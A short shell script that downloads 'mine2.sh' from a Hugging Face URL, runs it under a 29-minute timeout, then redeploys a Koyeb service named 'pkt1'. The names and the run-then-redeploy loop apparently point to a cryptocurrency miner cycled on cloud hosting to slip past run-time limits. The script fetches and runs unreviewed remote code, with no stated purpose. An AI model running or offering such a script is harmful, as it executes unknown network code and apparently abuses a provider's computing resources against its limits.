wget https://huggingface.co/myfiles/data/raw/main/mine2.sh
chmod +x mine2.sh
timeout 29m ./mine2.sh
chmod +x koyeb
./koyeb -c koyeb.yaml service redeploy pkt1/pkt1
